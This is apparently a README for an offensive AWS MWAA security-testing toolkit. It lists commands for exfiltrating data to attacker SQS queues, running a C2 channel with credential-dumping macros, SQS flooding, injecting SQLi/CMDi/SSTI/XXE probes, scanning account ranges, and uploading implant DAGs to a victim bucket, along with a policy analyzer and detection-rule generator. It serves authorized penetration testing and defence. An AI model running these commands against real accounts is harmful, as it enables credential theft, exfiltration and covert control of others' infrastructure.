# AWS-MWAA-SQS-Execution-Role-Research

![unnamed](https://github.com/user-attachments/assets/1f615e51-37ea-4303-8779-6dbd9e09f68d)

## Security Testing Tool

A comprehensive offensive security testing toolkit for validating AWS MWAA execution role SQS policy vulnerabilities. This tool covers all five attack vectors documented in the [research](aws-mwaa-post-exploitation.md):

1. **Data Exfiltration** -- Send data to attacker-controlled SQS queues
2. **Command & Control** -- Bidirectional C2 channel via SQS with interactive operator console
3. **Denial of Service** -- Message flooding and consumption attacks
4. **Cross-Account Event Injection** -- Inject crafted payloads into target queues
5. **Infrastructure Reconnaissance** -- Enumerate airflow-celery-* queues across accounts

Plus defensive capabilities:
- **IAM Policy Analyzer** -- Detect the vulnerable SQS wildcard pattern in execution roles
- **DAG Payload Generator** -- Generate ready-to-deploy Airflow DAGs for each attack vector
- **Detection Rule Generator** -- AWS Config Guard rules and CloudWatch Insights queries

> **For authorized security testing, penetration testing engagements, and defensive validation only.**

### Installation

```bash
pip install -r requirements.txt

# Or install as a CLI tool:
pip install -e .
```

### Quick Start

```bash
# Run all safe capability tests (uses your own account as source + target)
python -m mwaa_security_tool --attacker-account 123456789012 full-test

# Analyze an IAM role for the vulnerable policy
python -m mwaa_security_tool analyze role --role-name MyMWAAExecutionRole

# Full MWAA environment assessment
python -m mwaa_security_tool analyze full

# Generate detection rules
python -m mwaa_security_tool analyze detection-rules --output-dir ./detection_rules
```

### Module Reference

#### Data Exfiltration (`exfil`)

```bash
# Set up attacker-side receiving queue
python -m mwaa_security_tool --attacker-account ACCT_ID exfil setup

# Listen for exfiltrated data
python -m mwaa_security_tool --attacker-account ACCT_ID exfil listen --duration 600

# Direct test (no MWAA required -- validates cross-account SQS send)
python -m mwaa_security_tool --attacker-account ACCT_ID --source-profile victim exfil test

# Cleanup
python -m mwaa_security_tool --attacker-account ACCT_ID exfil cleanup
```

#### Command & Control (`c2`)

```bash
# Set up C2 infrastructure (command + results queues)
python -m mwaa_security_tool --attacker-account ACCT_ID c2 setup

# Interactive operator console
python -m mwaa_security_tool --attacker-account ACCT_ID c2 operator

# Send a single command
python -m mwaa_security_tool --attacker-account ACCT_ID c2 send "whoami"

# Full roundtrip test (no MWAA required)
python -m mwaa_security_tool --attacker-account ACCT_ID --source-profile victim c2 test

# Cleanup
python -m mwaa_security_tool --attacker-account ACCT_ID c2 cleanup
```

The operator console includes built-in macros:
- `!airflow-conns` -- Dump all Airflow connection credentials
- `!env` -- Dump environment variables
- `!s3-list` -- List accessible S3 buckets
- `!iam-whoami` -- Get the caller identity

#### Denial of Service (`dos`)

```bash
# Safe DoS risk assessment (creates/destroys temp queues)
python -m mwaa_security_tool --attacker-account ACCT_ID dos assess

# Controlled flood test (rate-limited, capped at 100 messages)
python -m mwaa_security_tool --attacker-account ACCT_ID dos flood --message-count 100

# Message consumption test (dry run by default)
python -m mwaa_security_tool --attacker-account ACCT_ID dos consume \
    --target-queue-url https://sqs.us-east-1.amazonaws.com/ACCT/QUEUE
```

#### Event Injection (`inject`)

```bash
# List available injection probe payloads
python -m mwaa_security_tool inject list-payloads

# Send a benign marker to a target queue
python -m mwaa_security_tool --source-profile victim inject send \
    --target-account TARGET_ACCT --target-queue airflow-celery-ingest --payload benign

# Send all probe payloads (SQLi, CMDi, deserialization, SSTI, XXE markers)
python -m mwaa_security_tool --source-profile victim inject send-all \
    --target-account TARGET_ACCT --target-queue airflow-celery-ingest

# Safe self-target test
python -m mwaa_security_tool --attacker-account ACCT_ID inject test
```

#### Infrastructure Reconnaissance (`recon`)

```bash
# Scan specific accounts
python -m mwaa_security_tool --source-profile victim recon scan \
    --accounts 111111111111,222222222222,333333333333

# Scan from a file of account IDs
python -m mwaa_security_tool --source-profile victim recon scan \
    --accounts account_ids.txt --threads 10

# Scan a numeric range
python -m mwaa_security_tool --source-profile victim recon scan-range \
    --start 100000000000 --count 500 --threads 10

# Test recon capability
python -m mwaa_security_tool --attacker-account ACCT_ID recon test
```

#### DAG Payload Generator (`dag`)

```bash
# Generate all DAG payloads
python -m mwaa_security_tool --attacker-account ACCT_ID dag generate \
    --output-dir ./generated_dags --target-accounts 111111111111,222222222222

# Generate specific DAG type
python -m mwaa_security_tool --attacker-account ACCT_ID dag generate --type c2

# Upload a DAG to the target MWAA S3 bucket
python -m mwaa_security_tool dag upload \
    --file ./generated_dags/dag_c2_implant.py \
    --bucket mwaa-dags-bucket --target-profile victim
```

#### Policy Analyzer (`analyze`)

```bash
# Analyze a specific role
python -m mwaa_security_tool analyze role --role-name AmazonMWAA-MyEnv-ExecutionRole

# Enumerate all MWAA environments
python -m mwaa_security_tool --attacker-profile victim analyze enumerate

# Full assessment (enumerate + analyze all roles)
python -m mwaa_security_tool --attacker-profile victim analyze full

# Generate detection rules (Config Guard + CloudWatch Insights)
python -m mwaa_security_tool analyze detection-rules --output-dir ./detection_rules
```

### Architecture

```
mwaa_security_tool/
├── __init__.py
├── __main__.py              # python -m entry point
├── cli.py                   # Main CLI with argparse
├── config.py                # Shared constants and dataclasses
├── utils.py                 # SQS/S3/IAM helpers, logging, formatting
├── modules/
│   ├── exfiltration.py      # Data exfiltration testing
│   ├── c2_channel.py        # C2 channel with operator console
│   ├── dos_simulation.py    # DoS simulation (rate-limited)
│   ├── event_injection.py   # Cross-account event injection probes
│   ├── recon.py             # Infrastructure reconnaissance scanner
│   ├── dag_generator.py     # Airflow DAG payload generator
│   └── policy_analyzer.py   # IAM policy analysis & detection rules
└── dag_payloads/            # Generated DAG files output directory
```

### Cross-Account Testing

Most tests support a `--source-profile` flag to simulate the MWAA execution role using a different AWS profile than the attacker. This allows testing with two separate AWS accounts:

```bash
# Attacker profile owns the receiving queues
# Source profile simulates the compromised MWAA execution role
python -m mwaa_security_tool \
    --attacker-account 111111111111 --attacker-profile attacker \
    --source-profile victim \
    full-test
```

### Related Research

See [aws-mwaa-post-exploitation.md](aws-mwaa-post-exploitation.md) for the full vulnerability analysis.
